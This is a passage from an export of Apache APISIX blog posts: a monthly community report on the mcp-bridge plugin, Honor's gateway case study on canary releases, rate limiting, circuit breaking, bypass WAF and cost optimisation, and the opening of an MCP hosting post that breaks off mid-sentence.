Solutions](https://static.api7.ai/uploads/2025/05/15/Ae6ayVyJ_timi-22.webp)\\n\\n### Implementation and Advantages of the Final Solution\\n\\nWe ultimately chose Solution Two, successfully establishing a new traffic path: new traffic reaches APISIX directly through canary deployment. This new architecture offers the following significant advantages:\\n\\n- **No Front-end Changes**: The domain names and entry points accessed by front-end users remain unchanged, ensuring uninterrupted user experience and avoiding potential user confusion or access interruptions caused by domain changes.\\n\\n- **Full Backend Autonomy**: The backend gains autonomous control and management over traffic switching, enabling flexible adjustment of traffic distribution based on business needs and system status without reliance on external coordination.\\n\\n- **Rapid Rollback Capability**: With canary release feature, any issues discovered during migration can be quickly rolled back to the original path, minimizing migration risks and ensuring stable business operations.\\n\\n- **User-Transparent Migration**: The entire migration process is transparent to users, who remain unaware of backend architectural changes during business access, ensuring a smooth and seamless migration.\\n\\nBelow is the overall migration process.\\n\\n![Migration Practices](https://static.api7.ai/uploads/2025/05/15/y1FiOjxR_timi-23.webp)\\n\\n## Conclusion\\n\\nOur team has developed the business-oriented API gateway TAPISIX based on APISIX. As the core component of our gateway architecture, APISIX has been instrumental in meeting stringent international compliance requirements, reducing development and operational overhead, and enhancing system flexibility and reliability.\\n\\nAPISIX\'s robust features\u2014such as high-performance routing, dynamic configuration capabilities, and a rich plugin ecosystem\u2014have enabled us to build a highly efficient, stable, and adaptable gateway platform. Looking ahead, we are excited to continue our collaboration with the APISIX community, exploring innovative application scenarios and unlocking greater value for our business."},{"id":"2025 Monthly Report (April 01 - April 30)","metadata":{"permalink":"/blog/2025/04/30/2025-april-monthly-report","source":"@site/blog/2025/04/30/2025-april-monthly-report.md","title":"2025 Monthly Report (April 01 - April 30)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2025-04-30T00:00:00.000Z","formattedDate":"April 30, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.04,"truncated":true,"authors":[],"prevItem":{"title":"APISIX Gateway Practices in Tencent Games","permalink":"/blog/2025/05/07/apisix-gateway-practice-in-tencent-timi"},"nextItem":{"title":"APISIX Gateway Practices in Honor\'s Massive Business","permalink":"/blog/2025/04/27/apisix-honor-gateway-practice-in-massive-business"}},"content":"> We have recently added a new plugin, `mcp-bridge`, to Apache APISIX. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom April 1st to April 30, 14 contributors made 54 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.api7.ai/uploads/2025/04/30/jAxKhTpu_2025-april-contributor-list.webp)\\n\\n![New Contributors List](https://static.api7.ai/uploads/2025/04/30/mrYsDF6W_april-new-contributors.webp)\\n\\n## Good First Issue\\n\\n### Translate English Documentation into Chinese for AI Plugins\\n\\nIssue: https://github.com/apache/apisix/issues/12161\\n\\nThe AI plugin category only has English documentation. To ensure developers from diverse backgrounds can effectively use and contribute to the project, Chinese documentation needs to be added.\\n\\n## Feature Highlights\\n\\n### Add `mcp-bridge` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12151\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nThis PR introduces a new plugin called `mcp-bridge`, enabling users to convert any stdio-based mcp server to HTTP SSE-based. It consists of two parts, one for stdio handling and subprocess lifecycle management, and a submodule for MCP session management.\\n\\nThis PR also includes a lightweight MCP session management module. It assigns session IDs and manages queues and ping timers for sessions. Using a shared dictionary, it ensures proper functionality even when SSE connections and RPC calls are handled by different NGINX workers.\\n\\n## Conclusion\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences.\\n\\n## Recommended Blogs\\n\\n- [From stdio to HTTP SSE: Host Your MCP Server with APISIX API Gateway](https://apisix.apache.org/blog/2025/04/21/host-mcp-server-with-api-gateway/)\\n\\n  Discover how the Apache APISIX mcp-bridge plugin seamlessly converts stdio-based MCP servers to scalable HTTP SSE services.\\n\\n- [Introducing APISIX AI Gateway](https://apisix.apache.org/blog/2025/04/08/introducing-apisix-ai-gateway/)\\n\\n  In Apache APISIX version 3.12.0, we have further enhanced its AI support capabilities as a modern API gateway. Through a rich plugin ecosystem and flexible architectural design, we provide developers with a complete AI gateway product.\\n\\n- [APISIX-MCP: Embracing Intelligent API Management with AI + MCP](https://apisix.apache.org/blog/2025/04/01/embrace-intelligent-api-management-with-ai-and-mcp/)\\n\\n  This article introduces the MCP protocol and its application in APISIX-MCP. APISIX-MCP simplifies API management through natural language interaction, supporting the creation, updating, and deletion of resources."},{"id":"APISIX Gateway Practices in Honor\'s Massive Business","metadata":{"permalink":"/blog/2025/04/27/apisix-honor-gateway-practice-in-massive-business","source":"@site/blog/2025/04/27/apisix-honor-gateway-practice-in-massive-business.md","title":"APISIX Gateway Practices in Honor\'s Massive Business","description":"Explore Honor\'s API gateway journey using APISIX, featuring traffic scheduling, rate limiting, circuit breaking, and observability enhancements.","date":"2025-04-27T00:00:00.000Z","formattedDate":"April 27, 2025","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":18.77,"truncated":true,"authors":[{"name":"Jiahao Fu","title":"Author"},{"name":"Weichuan Xu","title":"Author"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"2025 Monthly Report (April 01 - April 30)","permalink":"/blog/2025/04/30/2025-april-monthly-report"},"nextItem":{"title":"From stdio to HTTP SSE: Host Your MCP Server with APISIX API Gateway","permalink":"/blog/2025/04/21/host-mcp-server-with-api-gateway"}},"content":"> Authors: Jiahao Fu, Weichuan Xu, Engineers from the PAAS Department at Honor. This article is based on the presentation given by the two engineers at the APISIX Shenzhen Meetup on April 12, 2025.\\n\x3c!--truncate--\x3e\\n\\n## About Honor\\n\\nEstablished in 2013, [Honor](https://www.honor.com/global/) is a global leader in smart terminal solutions. Its products are sold in over 100 countries and regions worldwide, with partnerships established with more than 200 operators. Honor operates over 52,000 experience stores and dedicated counters globally, with over 250 million active devices in use.\\n\\nAs a world-class AI terminal ecosystem company, Honor is dedicated to revolutionizing human-machine interaction. Leveraging its diversified innovative product portfolio, including smartphones, personal computers, tablets, and wearable devices, Honor aims to empower every user to effortlessly enter and enjoy the new intelligent world.\\n\\n## Evolution and Architecture of Honor\'s Gateway\\n\\n### Evolution\\n\\n- Honor began exploring traffic gateway products in 2021, conducting preliminary research on APISIX in Q3, and officially introduced APISIX in Q4 to initiate the construction of its internal traffic gateway platform.\\n\\n- In 2022, APISIX was officially deployed in Honor\'s production environment. In Q1, pilot promotion of traffic access for consumer-facing (To C) business began; in Q2, APIs were open and available for deployment platforms, supporting traffic scheduling and container instance reporting. Furthermore, even when the deployment platform was not yet fully built, traffic access and scheduling can be performed by invoking APIs through scripts.\\n\\n- In 2023, Q1 saw the completion of APISIX-CP containerization, followed by the launch of APISIX-DP elastic scaling in Q3. By Q4, a single cluster supported over ten million connections, and by year-end, full coverage of cloud services for To C business was achieved.\\n\\n- In 2024, APISIX-DP containerization was completed in Q1, the runtime architecture was optimized to version 2.0 in Q2, and in Q4, Honor reached a throughput of 1 million QPS (queries per second) in a single cluster. By year-end, Honor\'s API gateway, built on Apache APISIX, supported all of Honor\'s business projects.\\n\\n- To date, the APISIX-based gateway platform within Honor has achieved peak traffic volumes of millions of QPS. Leveraging APISIX\'s extensibility, nearly 100 custom plugins have been developed.\\n\\n- Moving forward, Honor\'s technical team will explore the integration of AI with gateways and investigate how to enable automatic service reporting of gateways to Kubernetes.\\n\\n### Honor Gateway Architecture\\n\\n![Honor Gateway Architecture](https://static.api7.ai/uploads/2025/05/13/TZKlAQ73_1-honor-gateway-architecture-2.webp)\\n\\n#### Gateway Architecture\\n\\n1. **Protocols Supported for Internal and External Networks**\\n\\n   Honor\'s gateway architecture is divided into internal and external network access:\\n\\n   a. **Protocols supported for external network**: QUIC and HTTPS.\\n\\n   b. **Protocols supported for internal network**: HTTP, HTTPS, and gRPC. Among these, gRPC primarily handles AI-related traffic, with its QPS showing significant growth over the past year.\\n\\n2. **Load Balancer and Proxy Selection**\\n\\n   a. A **load balancer** (LB) is deployed in front of APISIX to connect with both layer 4 and layer 7 traffic in the public clouds.\\n\\n   b. **Layer 4 proxy**: Initially used to publish all routes, but due to business launch issues that layer 4 proxy could not resolve, the setup was switched to layer 7 proxy.\\n\\n3. **API Clusters and Plugin Marketplace**\\n\\n   a. **API clusters**: Multiple clusters share an etcd instance.\\n\\n   b. **Plugin marketplace**: Lists common plugins such as authentication, rate limiting, WAF, and traffic labeling.\\n\\n   c. **Upstream deployment**: Primarily based on containers, with a small number of virtual machines. Containers are connected to the deployment platform, which calls APIs to report traffic and instance information after container deployment.\\n\\n4. **Log Collection and Analysis**\\n\\n   The Prometheus plugin is not used. Instead, logs are collected via Kafka and combined with Elastic Stack for metric analysis and alerting.\\n\\n5. **etcd Load Balancing Optimization**\\n\\n   An additional layer of LB is added in front of etcd to address load imbalance issues when directly connecting to etcd nodes (e.g., excessively high node connection counts).\\n\\n#### Gateway Features\\n\\n- **User Workflow Management**: Covers domain management, certificate management, route registration, and canary release.\\n\\n- **Plugin Management**: Users upload plugins via the plugin marketplace, and the gateway platform conducts reviews and deployments.\\n\\n- **Intelligent Deployment**: Shields underlying cloud differences, supporting automated deployment and public cloud adaptation.\\n\\n#### Low-Loss Upgrades\\n\\nFrequent plugin changes during regular operations raise concerns about downtime. By detaching APISIX nodes via LB to ensure all traffic is fully offline before upgrading, automated low-loss upgrades is achieved.\\n\\n#### Elastic Scaling\\n\\nTo handle high-traffic scenarios, the gateway can be rapidly scaled out and promptly recovered via virtual machines, supporting automatic scaling. For example, when CPU usage exceeds a threshold, machines are automatically scaled out and attached to the load balancer.\\n\\n#### Plugin Deployment and Automation\\n\\n- **Plugin Deployment**: The management plane is connected to the runtime plane, with configurations pushed to CP for containerized deployment.\\n\\n- **CP and DP Isolation**: CP and DP connect to the etcd cluster, achieving isolation between the management and runtime planes.\\n\\n## Gateway Practice in Honor\'s Massive Business\\n\\nInitially, we utilized APISIX\'s native plugins. As business grew and requirements evolved, native plugins became insufficient. Consequently, we expanded plugins based on the platform or user-specific needs, resulting in over 100 plugins to date.\\n\\n<p align=\\"center\\">\\n  <img width=\\"550\\" alt=\\"Honor Plugin Ecosystem\\" src=\\"https://static.api7.ai/uploads/2025/05/13/Pk221A8e_2-honor-plugins-2.webp\\" />\\n</p>\\n\\nPlugins are categorized into four groups: traffic control, authentication, security, and observability. Since our clusters are predominantly deployed across dual Availability Zones (AZs) to ensure reliability, this setup introduces cross-AZ latency issues. To address this, the gateway facilitates local routing within the same AZ, ensuring traffic is forwarded to the nearest node.\\n\\n### 1. Observability: Traffic Mirroring\\n\\n<p align=\\"center\\">\\n  <img width=\\"700\\" alt=\\"Honor Traffic Mirroring\\" src=\\"https://static.api7.ai/uploads/2025/05/13/1wt6a77m_3-traffic-mirror-2.webp\\" />\\n</p>\\n\\n#### Request Processing and Traffic Mirroring\\n\\nAfter a request reaches APISIX, the traffic is forwarded to the upstream service. During this process, the request is mirrored to a third-party asset platform. However, this mirroring operation is blocking, meaning that if the recording platform does not return a response, the client\'s request is blocked. If the recording platform experiences a failure, it can severely impact the stability of production traffic. Therefore, instead of using the built-in mirroring features of NGINX or APISIX, we implemented asynchronous processing through a custom plugin.\\n\\n#### Asynchronous Traffic Processing via Custom Plugin\\n\\n1. When a request arrives: The request is asynchronously saved to a queue.\\n\\n2. Upstream processing: APISIX forwards the request to the upstream server. Once the upstream response is returned, the client request process concludes.\\n\\n3. Asynchronous recording: Asynchronous threads extract requests from the queue and send them to the analytics platform for data recording. Since recording requests include timestamps, asynchronous operations do not affect production traffic.\\n\\n<p align=\\"center\\">\\n  <img width=\\"700\\" alt=\\"Custom Plugin Implementation\\" src=\\"https://static.api7.ai/uploads/2025/05/13/7jNxZpWR_4-custom-plugin-2.webp\\" />\\n</p>\\n\\n#### Recording Platform Features\\n\\nThe recording platform is responsible for data collection and supports the following functionalities:\\n\\n- Allowing scaling of the traffic up or down during playback.\\n\\n- Adding specific headers to replayed requests, thus facilitating end-to-end stress testing.\\n\\n#### Queue and Thread Optimization\\n\\nTo ensure system performance, we support configuring queue sizes and thread performance parameters. Although asynchronous forwarding does not directly impact formal requests, excessive asynchronous traffic can still increase APISIX\'s CPU load. Therefore, it is recommended to select optimal parameters based on business requirements to balance performance and recording efficiency.\\n\\n### 2. Traffic Scheduling: Canary Release Plugin\\n\\nWe have platformized the canary release feature and optimized the canary release plugin.\\n\\n#### Optimized Canary Release Plugin\\n\\nTraditionally, canary release plugins support traffic distribution based on predefined rules or percentage-based allocations. However, percentage-based routing can lead to inconsistent traffic assignments; for instance, the same request might be routed to different environments at different times, potentially impacting stability in 2C scenarios.\\n\\nTo address this, a `key-hash` plugin is introduced in front of the canary release plugin, combining with the canary release plugin to achieve stable traffic percentage allocation. The specific implementation is as follows:\\n\\n1. Supports hash calculation based on specific request headers or Cookies.\\n\\n2. Uses the hash result as input for the canary release plugin to determine traffic allocation percentages.\\n\\nThis ensures consistent and stable traffic allocation, meeting the business requirements of To C scenarios.\\n\\n#### Transformed End-to-End Canary Release Plugin\\n\\nIn the end-to-end canary release scenario, we have transformed the canary release plugin to achieve precise traffic scheduling. As shown in the diagram below, Service A is in a canary state, while Services B and C are in the production environment. To maintain the current traffic flow from Service A to B while directing the traffic of Service C to the canary environment, this goal is achieved through an API gateway. The specific implementation is as follows:\\n\\n![End-to-End Canary Release Plugin Transformation](https://static.api7.ai/uploads/2025/05/13/HhJNflQZ_5-canary-plugin-2.webp)\\n\\n1. **Tag Traffic and Insert Request Header**\\n\\n    a. When traffic passes through the APISIX API gateway, it is tagged based on canary release policies.\\n\\n    b. If the traffic is canary traffic, the gateway inserts a specific request header (e.g., honor-tag:gray) into the request to indicate it as canary traffic.\\n\\n2. **Register and Tag Service**\\n\\n    a. When Service A registers with the registration center, it also registers its canary tag (e.g., gray).\\n\\n    b. The registration center maintains the mapping between service canary tags and instances.\\n\\n3. **Service-to-Service Scheduling**\\n\\n    a. Service A calling Service B:\\n\\n        i. After receiving a request, Service A first checks if the request contains a canary tag (e.g., honor-tag:gray).\\n\\n        ii. If the request includes a canary tag, Service A retrieves Service B\'s canary instances from the registration center based on the tag and prioritizes scheduling to canary instances.\\n\\n        iii. If Service B has no canary instances, it falls back to scheduling production instances.\\n\\n    b. Service B calling Service C:\\n\\n        i. After receiving the canary tag (e.g., honor-tag:gray) passed from Service A, Service B retrieves Service C\'s canary instances from the registration center based on the tag.\\n\\n        ii. If Service C has canary instances, the request is scheduled to the canary instance; otherwise, it is scheduled to a production instance.\\n\\n4. **End-to-End Canary Release**\\n\\n    a. Through the transparent transmission of request headers (e.g., honor-tag:gray), the canary tag remains consistent throughout the service chain.\\n\\n    b. Each node in the service chain makes scheduling decisions based on the canary tag, enabling end-to-end canary release.\\n\\nThrough these transformations, we have achieved precise traffic scheduling for end-to-end canary releases, ensuring consistency and stability of canary traffic across the entire service chain.\\n\\n### 3. Rate Limiting and Security\\n\\nAPISIX offers rich plugins covering single-node rate limiting and distributed rate limiting solutions. Below are optimization practices for the single-node rate-limiting solution.\\n\\n#### 3.1 Rate Limiting\\n\\n##### Single-Node Rate Limiting\\n\\n**Background and Challenges**\\n\\nInitially, when adopting the single-node rate limiting solution, we encountered several challenges.\\n\\n1. If users needed to set a global rate limit (e.g., 4,000 QPS), they had to manually coordinate with platform administrators to confirm the number of gateway nodes and allocate the rate limit value accordingly (e.g., 2,000 QPS per node for two nodes). This process was cumbersome and error-prone.\\n\\n2. In the elastic scaling scenario, when the gateway triggers scaling up or down, there may be a mismatch in the throttling values. For example, the CPU usage reached 80%, triggering an automatic scale-out. Assume each node was initially configured with a 2000 QPS limit; increasing the node count to three would inadvertently raise the total rate limit to 6000 QPS. This could overwhelm backend services, leading to potential system anomalies.\\n\\n<p align=\\"center\\">\\n  <img width=\\"500\\" alt=\\"Single-Node Rate Limiting\\" src=\\"https://static.api7.ai/uploads/2025/05/13/GzaePNL2_6-rate-limiting-2.webp\\" />\\n</p>\\n\\n**Solution**\\n\\nTo address these issues, we implemented the following solutions:\\n\\n<p align=\\"center\\">\\n  <img width=\\"500\\" alt=\\"Upgraded Single-Node Rate Limiting Solution\\" src=\\"https://static.api7.ai/uploads/2025/05/13/9egDM2V0_7-rate-limiting-upgrade-2.webp\\" />\\n</p>\\n\\n1. **Node Reporting and Maintenance**\\n\\n    a. Implementation: Utilizing the `server-info` plugin of APISIX, each DP node\'s information, such as hostname, is written to etcd as a leased key at regular intervals.\\n\\n    b. \\"Heartbeat Mechanism\\": By periodically updating (similar to a heartbeat mechanism), etcd consistently maintains all active DP node information in the API gateway.\\n\\n2. **Dynamic Rate Limiting Calculation**\\n\\n    a. Plugin Development: A new plugin periodically retrieves all the node information from etcd to determine the total number of gateway nodes.\\n\\n    b. Excluding CP Nodes: Due to control plane nodes do not handle traffic, only count the number of DP nodes.\\n\\n    c. Dynamic Rate Limit Adjustment: During rate limiting, the plugin dynamically calculates the base rate limit each node should handle, ensuring the rate limit aligns with the actual number of nodes.\\n\\n3. **Performance Optimization**\\n\\n    a. Privileged Process Pulling: Only privileged processes are allowed to periodically retrieve gateway information from etcd, reducing etcd load and minimizing APISIX overhead.\\n\\n    b. Shared Memory Mechanism: Privileged processes write retrieved data to shared memory, and other processes periodically query shared memory to obtain node information.\\n\\n4. **Plugin Abstraction and Reuse**\\n\\n    a. Common Plugin Abstraction: The dynamic rate limiting optimization capability is abstracted into a common plugin, providing a unified interface.\\n\\n    b. Plugin Reuse: Many internal plugins (e.g., fixed window rate limiting, custom performance plugins) can query the number of nodes from shared memory and dynamically adjust configurations to meet optimization requirements.\\n\\n##### Distributed Rate Limiting\\n\\nThe open-source APISIX community also provides a distributed rate-limiting solution.\\n\\n**Background and Challenges**\\n\\nWhen applying the open-source distributed rate limiting solution, we encountered the following key issues:\\n\\n1. **Redis Performance Bottleneck**: In scenarios where rate limiting is applied using a single key, particularly when the rate limit rule targets an entire route rather than specific route characteristics, the Redis key becomes overly singular. This leads to all requests being directed to the same Redis shard, preventing effective load balancing through horizontal scaling.\\n\\n2. **Network Performance Overhead**: Frequent Redis requests result in a significant increase in CPU usage, with utilization rising by over 50%.\\n\\n3. **Increased Request Latency**: Open-source distributed rate limiting solutions typically require accessing Redis to complete counting before forwarding the request upstream. This process adds 2\u20133 milliseconds to the latency of business requests.\\n\\n<p align=\\"center\\">\\n  <img width=\\"500\\" alt=\\"Distributed Rate Limiting\\" src=\\"https://static.api7.ai/uploads/2025/05/13/XLwUO4Gc_8-distributed-rate-limiting-2.webp\\" />\\n</p>\\n\\n**Solution**\\n\\nTo address these issues, we designed the following optimizations:\\n\\n<p align=\\"center\\">\\n  <img width=\\"500\\" alt=\\"Upgraded Distributed Rate Limiting Solution\\" src=\\"https://static.api7.ai/uploads/2025/05/13/J4Ie3Hkg_9-distributed-rate-limiting-upgrade-2.webp\\" />\\n</p>\\n\\n1. **Introducing Local Counting Cache**:\\n\\n    a. **Local Counting Mechanism**: When a request arrives, a count is first deducted from the local counting cache. If the count does not reach zero, the request is allowed to proceed.\\n\\n    b. **Asynchronous Synchronization Mechanism**: The local count is periodically synchronized with Redis asynchronously. The number of requests between two synchronization periods is counted and deducted from Redis. After synchronization, the Redis count overrides the local cache, ensuring consistency in distributed rate limiting.\\n\\n2. **Error Control**: By applying reasonable formulas and parameter configurations, the error rate is controlled within 3\u20134%, ensuring rate limiting accuracy meets business requirements.\\n\\n**Applicable Scenarios**\\n\\n- **High QPS Applications**: This solution is suitable for high QPS applications, significantly reducing Redis performance bottlenecks and network overhead.\\n\\n- **Low QPS Applications**: For low QPS applications (e.g., a few hundred QPS), the existing distributed rate limiting solution generally meets requirements without additional optimization.\\n\\n#### 3.2 High-Reliable Circuit Breaker Plugin\\n\\n**Background and Challenges**\\n\\nAlthough the open-source community provides a circuit breaker plugin, evaluation revealed it does not meet internal requirements in two aspects:\\n\\n1. **Lack of Failure Rate Support**: The open-source circuit breaker plugin strategy does not support circuit breaking based on failure rates.\\n\\n2. **State Transition**: The circuit breaker plugin has only on/off states, which may allow a large number of requests to pass during state transitions, exacerbating upstream service degradation and potentially collapsing the gateway due to upstream response timeouts.\\n\\n**Custom Circuit Breaker Plugin**\\n\\nTo address these issues, Honor developed a new circuit breaker plugin based on APISIX. Its design features include:\\n\\n![Custom Circuit Breaker Plugin](https://static.api7.ai/uploads/2025/05/13/OtD0QeE2_10-circuit-breaking-plugin-2.webp)\\n\\n1. **Percentage-Based Circuit Breaking Strategy**: Supports circuit breaking based on percentages, offering finer control.\\n\\n2. **Three-State Control Mechanism**:\\n\\n    a. Closed State: All requests are allowed to pass.\\n\\n    b. Open State: All requests are rejected until the circuit breaker time expires.\\n\\n    c. Half-Open State: A limited number of requests are allowed to pass to assess whether upstream services have recovered.\\n\\n3. **Silent Count Mechanism**: The concept of a silent count is introduced to prevent state transitions triggered by a small number of requests. Only when the request count reaches the silent count and the failure rate exceeds the threshold does the state transition to open.\\n\\n**State Transition Process**\\n\\n- **Closed to Open**: When the request count reaches the silent count and the failure rate exceeds the threshold, the circuit breaker transitions to the open state.\\n\\n- **Open to Half-Open**: After the circuit break time expires, the state transitions to half-open.\\n\\n- **Half-Open to Closed**: In the half-open state, if the number of allowed requests reaches the configured value and upstream services recover, the state transitions to closed; if the failure rate remains high or there is no response, it reverts to the open state.\\n\\n**Design Updates Based on Sentinel**\\n\\n- **Window Mechanism**: Unlike Sentinel\'s sliding window, we adopted a fixed window focused on failure rates within a time period, simplifying implementation and reducing performance overhead.\\n\\n- **Architecture Adaptation**: To accommodate NGINX\'s multi-process architecture, shared memory was introduced to store state, ensuring consistent behavior across workers and avoiding the complexity and performance costs associated with sliding windows.\\n\\n#### 3.3 Enhance Reliability with Bypass WAF\\n\\n**Limitations of Inline WAF**\\n\\nAs shown in the left architecture diagram, traditional WAFs require modifying DNS records to route traffic to the WAF. After inspecting and filtering the traffic, WAFs forward it back to the origin server. However, this architecture is prone to single points of failure. If the WAF itself encounters a malfunction, it can disrupt the entire traffic flow, adversely affecting business operations.\\n\\n![Upgraded Bypass WAF Solution](https://static.api7.ai/uploads/2025/05/13/RQXL4gUx_11-waf-2.webp)\\n\\n**Bypass WAF**\\n\\nTo resolve this issue, Honor, in collaboration with [API7.ai](https://api7.ai/) and Tencent Cloud, implemented a bypass WAF architecture:\\n\\n1. **Optimized Traffic Path**: Traffic no longer needs to pass through the WAF; instead, it is directed straight to the APISIX cluster.\\n\\n2. **Traffic Splitting for Detection**: Within the APISIX cluster, a portion of the traffic is forwarded to the WAF for inspection to determine whether it is normal or contains malicious attacks (e.g., egress attacks and command egress attacks).\\n\\n3. **Status Code Response Mechanism**:\\n\\n    a. If the WAF detects normal traffic, it returns a `200` status code, allowing the request to pass through to the upstream server.\\n\\n    b. If the WAF detects malicious attacks, it returns a status code similar to `403`, rejecting the request.\\n\\n4. **Fault Tolerance**: If the WAF fails, traffic can be directly forwarded to the backend, preventing link interruption due to WAF failure and enhancing overall link reliability.\\n\\n## Performance and Cost Optimization\\n\\n### Performance Optimization\\n\\n#### Health Checker Optimization\\n\\n**Background and Challenges**\\n\\nIn high-traffic internal business scenarios, with over a thousand upstream nodes, frequent rolling updates triggered the destruction and creation of health checkers. This led to significant CPU usage spikes.\\n\\n1. Upstream Destruction and Creation: Upon upstream updates, health checkers were destroyed. Health checkers are only probed when client requests arrive; if they do not exist, they are immediately created.\\n\\n2. Node-by-Node Addition: During creation, all nodes had to be traversed and individually added to the health checker\'s shared memory. This process involved extensive locking operations and memory writes, resulting in significant performance degradation.\\n\\n**Solutions**\\n\\n1. **Delayed Destruction**: During upstream updates, health checkers are temporarily not destroyed but merely lose their references, reducing performance overhead from frequent destruction and creation.\\n\\n2. **Caching Mechanism**: When creating health checkers, they are cached with their creation time recorded. Subsequent requests first check if the health checker exists. If not, the cache is replenished. If not expired, it is directly returned; if expired, it is recreated.\\n\\n3. **Batch Updates**: All upstream nodes are batch-updated to the health checker\'s shared memory, reducing the overhead of node-by-node operations.\\n\\n4. **Concurrency Control**: A concurrency control mechanism is introduced to ensure only one worker is responsible for creating health checkers at any given time, preventing multiple workers from performing the same operation simultaneously and significantly reducing CPU consumption.\\n\\n**Results**\\n\\nIn scenarios involving frequent updates of 2,000 upstream nodes, the optimized approach resulted in only a ~2% increase in CPU usage, a substantial improvement compared to the previous 20% increase. This demonstrates a significant reduction in performance overhead and highlights the effectiveness of the optimization.\\n\\n![Health Checker Optimization](https://static.api7.ai/uploads/2025/05/14/Y80U5dQy_optimized-health-checker-2.webp)\\n\\n#### Cost Optimization\\n\\nCost optimization primarily focuses on three aspects: traffic compression, static single-line EIP transformation, and gateway scaling.\\n\\n#### Traffic Compression\\n\\n**Background**\\n\\nThrough statistics on gateway costs, approximately three-quarters of the total cost is attributed to traffic costs. Therefore, our optimization efforts first target traffic reduction.\\n\\n**Solutions**\\n\\nHonor provides compression plugins such as br and gzip, supporting dynamic compression. These plugins are user-friendly; businesses only need to include a compression identifier in the request, and clients and browsers typically support decompression.\\n\\n**Results**\\n\\nIn cloud providers\' LB billing models, traffic volume is the primary billing factor. By using compression plugins, LB costs and EIP bandwidth costs can be reduced, with a maximum compression rate exceeding 70%, significantly lowering traffic costs.\\n\\n#### Static Single-Line EIP Transformation\\n\\n**Background**\\n\\nBGP EIP bandwidth costs are prohibitively high.\\n\\n**Solutions**\\n\\n1. Configure a static single-line EIP for gateway clusters, supplemented by a backup BGP EIP.\\n\\n2. Use DNS intelligent resolution to direct mainstream carrier routes to corresponding single-line EIPs.\\n\\n**Results**\\n\\nSingle-line EIP costs are one-third of BGP EIP costs, saving approximately two-thirds of public network bandwidth expenses.\\n\\n#### Gateway Scaling\\n\\n**Optimization**\\n\\nImplement elastic gateway scaling based on CPU and memory utilization.\\n\\n**Results**\\n\\nEnsure resource utilization remains within a reasonable range to avoid resource waste or insufficiency.\\n\\n## Summary\\n\\nSince adopting APISIX in 2021, Honor has developed a high-performance, scalable, and reliable API gateway to support the rapid growth of its extensive business through continuous optimization and expansion. The following are the achievements of Honor using Apache APISIX:\\n\\n- **Traffic Handling**: Honor\'s API gateway has evolved from pilot deployments to comprehensive coverage, handling peak traffic volumes reaching millions of QPS.\\n\\n- **Plugins**: To meet diverse business requirements, Honor has developed nearly 100 custom plugins.\\n\\n- **Architecture Stability and Scalability**: Through optimizations such as internal and external network protocol supports, load balancer upgrades, and plugin marketplace development, the platform\'s stability and scalability have been enhanced.\\n\\n- **Features**: optimizations such as canary releases, rate limiting, circuit breaking, and bypass WAF architecture ensure precise traffic scheduling and enhance reliability.\\n\\n- **Performance**: Health checker optimizations and concurrency control significantly lower CPU usage.\\n\\n- **Cost**: Strategies like traffic compression, EIP transformation, and scaling techniques substantially reduce expenses.\\n\\n## Future Outlook\\n\\nMoving forward, Honor plans to integrate artificial intelligence into its API gateway platform to enhance intelligent traffic management and decision-making processes. Additionally, through innovative approaches such as containerized auto-reporting mechanisms, Honor aims to help internal teams achieve efficient resource management and business deployment in Kubernetes environments."},{"id":"From stdio to HTTP SSE: Host Your MCP Server with APISIX API Gateway","metadata":{"permalink":"/blog/2025/04/21/host-mcp-server-with-api-gateway","source":"@site/blog/2025/04/21/host-mcp-server-with-api-gateway.md","title":"From stdio to HTTP SSE: Host Your MCP Server with APISIX API Gateway","description":"Discover APISIX-MCP, leveraging AI for effortless API management. Simplify resource operations with natural language in Apache APISIX.","date":"2025-04-21T00:00:00.000Z","formattedDate":"April 21, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.585,"truncated":true,"authors":[{"name":"Ming Wen","title":"author","url":"https://www.linkedin.com/in/ming-wen-api7/","image_url":"https://github.com/moonming.png","imageURL":"https://github.com/moonming.png"},{"name":"Zeping Bai","title":"author","url":"https://github.com/bzp2010","image_url":"https://github.com/bzp2010.png","imageURL":"https://github.com/bzp2010.png"}],"prevItem":{"title":"APISIX Gateway Practices in Honor\'s Massive Business","permalink":"/blog/2025/04/27/apisix-honor-gateway-practice-in-massive-business"},"nextItem":{"title":"Introducing APISIX AI Gateway","permalink":"/blog/2025/04/08/introducing-apisix-ai-gateway"}},"content":">Discover how the Apache APISIX mcp-bridge plugin seamlessly converts stdio-based MCP servers to scalable HTTP SSE services.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nIn contemporary API infrastructure, HTTP protocols and streaming communications (like SSE, WebSocket) have become mainstream for building real-time, interactive applications. Over the past few months, the Model Context Protocol (MCP) has gained popularity. However, most MCP Servers are implemented via stdio for local environments and cannot be invoked by external services and developers.\\n\\nTo bridge these services with modern API architectures, Apache APISIX has introduced the `mcp-bridge` plugin. It seamlessly converts stdio-based MCP services into HTTP SSE streaming interfaces and manages them through an API gateway for routing and traffic management.\\n\\n## Model Context Protocol (MCP) Overview\\n\\nMCP is an open protocol that standardizes how AI applications provide context information to large language models (LLMs). It allows developers to switch between different LLM providers while ensuring data security and facilitating integration with local or remote data sources. Supporting a client-server architecture, MCP servers expose specific functionalities that are accessible to clients via these servers.\\n\\n## What Is the 